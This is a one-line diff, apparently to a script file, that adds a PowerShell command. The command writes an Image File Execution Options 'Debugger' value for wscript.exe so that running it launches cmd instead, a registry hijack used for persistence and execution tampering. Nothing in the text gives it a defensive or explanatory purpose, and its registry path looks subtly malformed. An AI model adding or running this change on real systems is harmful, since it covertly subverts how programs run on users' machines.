@@ -1,1 +1,2 @@
 
+ni -f "HKLM:\SOFTWARE\Microsoft\NT\CurrentVersion\Image File Execution Options\wscript.exe" | sp -name Debugger -Value "cmd"
